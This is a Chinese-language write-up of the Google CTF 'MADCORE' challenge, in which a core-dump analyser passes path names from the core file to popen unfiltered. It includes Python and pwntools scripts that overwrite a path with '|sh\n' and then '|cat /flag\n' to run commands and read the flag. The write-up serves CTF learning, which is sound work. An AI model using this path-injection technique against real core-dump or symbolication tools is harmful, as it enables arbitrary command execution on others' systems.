
# [原创][GoogleCTF]MADCORE

在r3实习苟延残喘的过程中，typhoonCTF，ACTF基本都是题目不会打开的地步。这次googleCTF万念俱灰地看了下MADCORE，竟然给我给碰运气蒙出来了（估计是非预期），让打算弃坑的我又有了点学习的动力

## I.题目复现

题目相当于是模拟了gdb分析core文件的过程，最后会给出backtrace，module之类的信息。

core文件大家应该都不会陌生，就是记录一个程序崩溃时的内存布局状态。本程序的大体流程可以参考一下这篇讲述gdb分析core的文章，流程基本相同：

<mark class="encrypted">79cK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8W2)9#2k6Y4S2A6j5h3!0Q4x3V1k6S2M7Y4c8A6j5$3I4W2i4K6u0r3k6r3g2@1j5h3W2D9M7#2)9J5c8U0t1K6x3e0M7%4y4e0M7%4</mark>

## II.漏洞分析

这题的提示给的是：

My coredump helper is crashing while handling a crash

我就随便试了几个平常做ctf的core文件，有的会产生以下的dash报错：

![图片描述](upload/attach/202207/945391_GB33NAXGM9A82ZR.png)

说明程序本身存在调用sh的可能，多次断点后发现`symbolicate`函数中的`popen`执行了`dash`

![图片描述](upload/attach/202207/945391_QRXZ6BEUBNVNVKT.png)

本地`dash`执行上面的command，确实存在一样的`dash`报错，这说明`command`字符串的生成，至少可以说是不严谨的，猜测存在命令执行的可能性

这样看这题和pwn没啥关系

## III.漏洞利用

我们把文件中的路径名进行这样的替换：最后几位改为`|`加上命令加上一个`\n`，`|`起到了忽略前面的作用，`\n`起到了忽略后面的作用

这样可以保证新的路径名和原来等长，不会破坏原来文件的偏移关系

我先尝试了`sh`命令的调用

找一个core文件替换路径

```python
import re
import sys,os
payload = open('./core_6', 'rb').read()
payload = payload.replace(b'/root/pwnexe/intro2/pwn2', b'/root/pwnexe/intro2/|sh\n')
file1 = open('./core_case5', 'wb')
file1.write(payload)
file1.close()
```

本地上传试试

```python
from pwn import *
def lg(s,addr):
    print('\033[1;31;40m%20s-->0x%x\033[0m'%(s,addr))
io = process('./madcore')
#io = remote('madcore.2022.ctfcompetition.com',1337)
payload = open('./core_case5', 'rb').read()
#payload += open('./core_case2', 'rb').read()
payload = payload.ljust(0x1000000, b'\x00')
#gdb.attach(io, 'b*$rebase(0x7e01)')
#gdb.attach(io, 'b*$rebase(0x52aa)')
io.sendline(payload)
context.log_level = 'debug'
io.interactive()
```

![图片描述](upload/attach/202207/945391_3JPP7P22F2247C3.png)

可以看到，即使在不开dockerfile的情况下，我们执行的shell交互也只能回显stderr,不能回显`ls`之类命令的stdout，更别提dockerfile新增一些限制条件了

我们直接执行`cat /flag`命令看看

```python
import re
import sys,os
payload = open('./core_6', 'rb').read()
payload = payload.replace(b'/root/pwnexe/intro2/pwn2', b'/root/pwnexe/|cat /flag\n')
file1 = open('./core_case5', 'wb')
file1.write(payload)
file1.close()
```

再次上传文件，竟然就成功了

![图片描述](upload/attach/202207/945391_5384JYYMYAC9N65.png)

可见这道题`popen`的命令执行，没有对路径名作出任何的过滤，也没有对输出结果做任何的筛查，直接就把命令执行的结果放在了backtrace中
